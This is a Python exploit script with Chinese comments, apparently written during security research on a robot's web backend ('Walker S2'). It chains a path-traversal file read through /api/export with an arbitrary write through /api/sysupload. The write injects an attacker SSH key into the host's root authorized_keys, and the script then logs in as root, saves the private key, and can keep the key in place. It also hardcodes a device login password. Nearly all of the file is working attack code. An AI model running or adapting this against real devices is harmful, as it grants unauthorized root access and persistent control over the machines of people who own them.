#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · RCE #2：sysupload board_name=vision 写【宿主】/root/.ssh/authorized_keys
→ vision 板宿主 root SSH（全链纯 HTTP 可复现，SSH 登录是回报）。

原理（docker inspect 实锤）：
  walker-web.web-backend-1 以 root 运行（User 空），bind-mount 直通宿主：
    /root/.ssh  -> /root/.ssh   (rw)
    /etc/walker -> /etc/walker  (rw)
    /tmp        -> /tmp         (rw)
  之前误判 /root/.ssh 为只读（HTTP 500 实为 EISDIR：path 被 os.makedirs 建成目录）。
  容器内 /root/.ssh 即宿主 root 的 .ssh，sysupload board_name=vision 把
  authorized_keys 覆盖成"原内容+新公钥" → ssh root@vision（新公钥）→ 宿主 root shell。

用法:
  python vision_host_root_rce.py --probe         # 仅无害探针：写/读/清 /root/.ssh 探针
  python vision_host_root_rce.py --rce           # 探针 + 注入 + ssh root + 恢复
  python vision_host_root_rce.py --restore       # 从 evidence 备份恢复 host /root/.ssh/authorized_keys

红线: 改的是宿主 root SSH 授权文件，先备份、默认恢复；探针文件会被清理。
"""
import argparse
import base64
import io
import os
import secrets
import sys
import tarfile
import time

import paramiko
import requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

VISION = "192.168.11.3"
MAP_ROOT = "/etc/walker/map"
ROOT_SSH = "/root/.ssh"
AUTHKEYS = f"{ROOT_SSH}/authorized_keys"
HARD_PASS = "aa"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
EVIDENCE_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "evidence")


def traversal(abs_path: str) -> str:
    depth = len([s for s in MAP_ROOT.split("/") if s])
    return "../" * depth + abs_path.lstrip("/")


def api_export_read(host: str, abs_path: str) -> bytes | None:
    r = requests.post(f"http://{host}:5000/api/export",
                      json={"map_names": [traversal(abs_path)]}, timeout=15)
    if r.status_code != 200:
        return None
    t = tarfile.open(fileobj=io.BytesIO(r.content), mode="r:*")
    for m in t.getmembers():
        f = t.extractfile(m)
        if f:
            return f.read()
    return None


def sysupload_write(host: str, abs_path: str, content: bytes,
                    board: str = "vision", filename: str = "upload.bin"):
    print(f"[>] POST http://{host}:5000/api/sysupload")
    print(f"    multipart: file=<{filename} {len(content)}B>  path={abs_path!r}  board_name={board!r}")
    files = {"file": (filename, content)}
    data = {"path": abs_path, "board_name": board}
    r = requests.post(f"http://{host}:5000/api/sysupload", files=files, data=data, timeout=20)
    print(f"[<] HTTP {r.status_code}  {r.text[:240]}")
    return r


def ssh_cmd(host: str, user: str, password: <密码_01>, cmd: str) -> tuple[str, str]:
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, username=user, password=<密码_01>, timeout=15)
    _, o, e = cli.exec_command(cmd, timeout=25)
    out = o.read().decode(errors="replace")
    err = e.read().decode(errors="replace")
    cli.close()
    return out, err


def probe_writable(host: str) -> bool:
    print("\n" + "=" * 66)
    print("[1] 无害探针: 写宿主 /root/.ssh/.write_probe_<rand>（非 authorized_keys）")
    print("=" * 66)
    rand = secrets.token_hex(4)
    probe_name = f".write_probe_{rand}"
    probe_path = f"{ROOT_SSH}/{probe_name}"
    content = f"host-root write probe {rand}\n".encode()
    r = sysupload_write(host, ROOT_SSH, content, board="vision", filename=probe_name)
    if r.status_code != 200:
        print(f"[!] 写 /root/.ssh 被拒（HTTP {r.status_code}）。")
        print("    说明容器实际无写权限（之前误判为只读 mount，需重新核实）。")
        return False
    time.sleep(0.3)
    got = api_export_read(host, probe_path)
    if got and got == content:
        print(f"[+] 宿主 /root/.ssh 可写 ✅  export 读回一致: {got!r}")
        # 清理探针（用已确认的 <密码_01>+sudo，保持设备干净）
        out, err = ssh_cmd(host, "walker", HARD_PASS, f"sudo rm -f {probe_path}")
        print(f"[+] 探针已清理  rm: {out.strip() or err.strip() or '(ok)'}")
        return True
    print(f"[!] 写成功但读回不一致: {got!r}（可能被别处覆盖/路径不同）")
    return False


def host_root_rce(host: str, keep: bool):
    print("\n" + "=" * 66)
    print("[ RCE ] sysupload → 宿主 /root/.ssh/authorized_keys 注入 → ssh root")
    print("=" * 66)
    key = paramiko.RSAKey.generate(2048)
    pub = key.get_name() + " " + key.get_base64() + " host-root-rce@research"
    print(f"[*] 新公钥: {pub[:70]}...")

    # ---- 2) 备份宿主 authorized_keys ----
    print("\n" + "-" * 66)
    print(f"[2] 备份宿主 {AUTHKEYS}（export 穿越读 /root/.ssh/authorized_keys）")
    orig = api_export_read(host, AUTHKEYS)
    print(f"    原内容: {len(orig) if orig else 0}B  {orig[:70]!r}...")
    if orig is None:
        print("[!] 备份失败（读不到 /root/.ssh/authorized_keys，可能不存在）")
        return False
    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    with open(os.path.join(EVIDENCE_DIR, "backup_authorized_keys.host_root"), "wb") as f:
        f.write(orig)
    print(f"    已存: evidence/backup_authorized_keys.host_root")

    # ---- 3) 注入 ----
    print("\n" + "-" * 66)
    print(f"[3] 注入: path=/root/.ssh filename=authorized_keys（宿主 root SSH 授权）")
    new_content = orig.rstrip(b"\n") + b"\n" + pub.encode() + b"\n"
    r = sysupload_write(host, ROOT_SSH, new_content, board="vision", filename="authorized_keys")
    if r.status_code != 200:
        print(f"[!] 注入被拒 HTTP {r.status_code}，请用 --restore 恢复")
        return False

    # ---- 4) ssh root（新公钥）----
    time.sleep(0.4)
    print("\n" + "-" * 66)
    print(f"[4] ssh root@{host}（新公钥）→ 宿主 root shell")
    ok = False
    try:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cli.connect(host, username="root", pkey=key, timeout=15)
        _, o, e = cli.exec_command("id; hostname; uname -m", timeout=25)
        out = o.read().decode(errors="replace")
        err = e.read().decode(errors="replace")
        print(f"[<] {out}")
        if err.strip():
            print(f"[!] stderr: {err}")
        keyfile = os.path.join(SCRIPT_DIR, "host_root_key.pem")
        with open(keyfile, "w") as f:
            key.write_private_key(f)
        print(f"[+] 宿主 ROOT SHELL 达成 ✅")
        print(f"    手动交互: ssh -i {keyfile} root@{host}")
        cli.close()
        ok = True
    except Exception as ex:
        print(f"[!] ssh root 失败: {ex}")
        print("    可能原因: StrictModes 拒绝 644 权限，或 authorized_keys 有残留目录。")

    # ---- 5) 恢复 ----
    print("\n" + "-" * 66)
    if keep:
        print("[5] --keep：保留注入公钥在宿主 /root/.ssh/authorized_keys")
    else:
        print(f"[5] 恢复宿主 {AUTHKEYS}（写回原内容，chmod 600）")
        b64 = base64.b64encode(orig).decode()
        out, err = ssh_cmd(host, "walker", HARD_PASS,
                           f"echo {b64} | base64 -d | sudo tee {AUTHKEYS} >/dev/null; "
                           f"sudo chmod 600 {AUTHKEYS}; sudo wc -c {AUTHKEYS}")
        print(f"    wc: {out.strip()}  (原 {len(orig)}B)  stderr: {err.strip()[:100]}")
        if out.strip().split()[0] == str(len(orig)):
            print("[+] 已恢复 ✅")
        else:
            print("[!] 恢复大小不符，请手工恢复 evidence/backup_authorized_keys.host_root")
    return ok


def restore(host: str):
    print("=" * 66)
    print(f"[ 恢复 ] 从备份恢复宿主 {AUTHKEYS}")
    print("=" * 66)
    bpath = os.path.join(EVIDENCE_DIR, "backup_authorized_keys.host_root")
    if not os.path.exists(bpath):
        print(f"[!] 无备份: {bpath}")
        return
    orig = open(bpath, "rb").read()
    b64 = base64.b64encode(orig).decode()
    out, err = ssh_cmd(host, "walker", HARD_PASS,
                       f"echo {b64} | base64 -d | sudo tee {AUTHKEYS} >/dev/null; "
                       f"sudo chmod 600 {AUTHKEYS}; sudo wc -c {AUTHKEYS}")
    print(f"[<] wc: {out.strip()}  (应 {len(orig)}B)  stderr: {err.strip()[:120]}")
    if out.strip().split()[0] == str(len(orig)):
        print("[+] 已恢复 ✅")
    else:
        print("[!] 恢复失败，请检查")


def main():
    ap = argparse.ArgumentParser(description="RCE#2: 写宿主 /root/.ssh → vision host root")
    ap.add_argument("--host", default=VISION)
    ap.add_argument("--probe", action="store_true", help="仅无害探针")
    ap.add_argument("--rce", action="store_true", help="探针+注入+ssh root+恢复")
    ap.add_argument("--keep", action="store_true")
    ap.add_argument("--restore", action="store_true")
    args = ap.parse_args()

    if args.restore:
        restore(args.host)
        return

    if not probe_writable(args.host):
        print("\n[!] 宿主 /root/.ssh 不可写，链断。")
        return

    if args.rce:
        host_root_rce(args.host, args.keep)
    else:
        print("\n[*] 仅探针完成（无害）。加 --rce 执行完整宿主 root RCE。")


if __name__ == "__main__":
    main()
